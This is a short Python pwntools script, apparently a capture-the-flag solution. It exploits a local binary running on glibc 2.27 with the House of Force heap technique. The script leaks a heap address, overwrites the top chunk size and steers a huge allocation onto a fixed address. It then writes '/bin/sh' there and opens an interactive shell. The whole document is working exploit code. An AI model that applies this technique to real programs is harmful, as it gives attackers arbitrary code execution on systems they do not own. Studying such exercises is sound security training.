from pwn import *

p = process(["/mnt/d/desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/ld-2.27.so", "./my"],
            env={"LD_PRELOAD":"/mnt/d/desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6"})

context(arch='arm64', os='linux', log_level='debug')

def add(size,context):
    p.recvuntil('> ')
    p.sendline(b'1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    p.recvuntil('data: ')
    p.send(context)

p.recvuntil('gift :D ')
addr = int(p.recvuntil('\n', drop = True),16)
top_heap = addr + 0xa0
success('addr:' + hex(top_heap))
heap = 0x601088-top_heap-0x10

add(0x18,b'a'*0x10 + p64(0xffffffffffffffff))
print(heap)
add(heap,b'bbbb')
add(0x10,b'\x00'*8+b'/bin/sh\x00')
p.recvuntil('> ')
p.sendline(b'2')

p.interactive()